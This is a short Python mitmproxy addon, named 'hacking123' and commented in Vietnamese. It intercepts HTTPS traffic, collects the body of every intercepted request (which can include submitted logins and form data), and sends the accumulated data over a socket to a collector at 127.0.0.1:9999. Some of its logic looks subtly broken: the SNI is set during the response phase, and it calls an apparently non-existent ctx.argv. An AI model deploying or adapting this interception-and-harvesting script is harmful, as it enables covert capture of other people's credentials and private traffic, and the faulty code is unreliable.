from mitmproxy import http
from mitmproxy import ctx
import socket
import threading

class hacking123:
    
    array_host = []
    

    def __init__(self):
        self.ssl_bump_enabled = True

    def request(self, flow: http.HTTPFlow) -> None:
        # Xử lý yêu cầu trước khi gửi đến máy chủ
        print(f"[CLIENT TO SERVER] {flow.request.pretty_host}")


    def response(self, flow: http.HTTPFlow) -> None:
        # Xử lý phản hồi từ máy chủ trước khi gửi đến ứng dụng
        # print(f"[SERVER TO CLIENT] {flow.response.headers}")

        if flow.request.scheme == 'https':
            if self.ssl_bump_enabled and not flow.server_conn.sni:
                flow.server_conn.sni = flow.request.host

        decoded_content = flow.response.content.decode('latin-1')
        # print(f"[RESPONSE CONTENT] {decoded_content}")

        hacking123.array_host.append(flow.request.content.decode("utf-8"))

        print(f"[ALL HOST] --->{hacking123.array_host}<------")


        #socket 
        HOST = '127.0.0.1'  # Địa chỉ IP của server
        PORT = 9999         # Cổng mà server socket lắng nghe

        array = hacking123.array_host
        data = ','.join(map(str, array))

        # Tạo socket và kết nối đến server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))

        # Gửi dữ liệu đến server
        client_socket.sendall(data.encode())
        client_socket.close()


addons = [
    hacking123()
]

def start_proxy():
    ctx.log.info("Bắt đầu proxy server...")
    from mitmproxy.tools.main import mitmdump
    mitmdump(['-s', __file__] + ctx.argv[1:])

if __name__ == '__main__':
    start_proxy()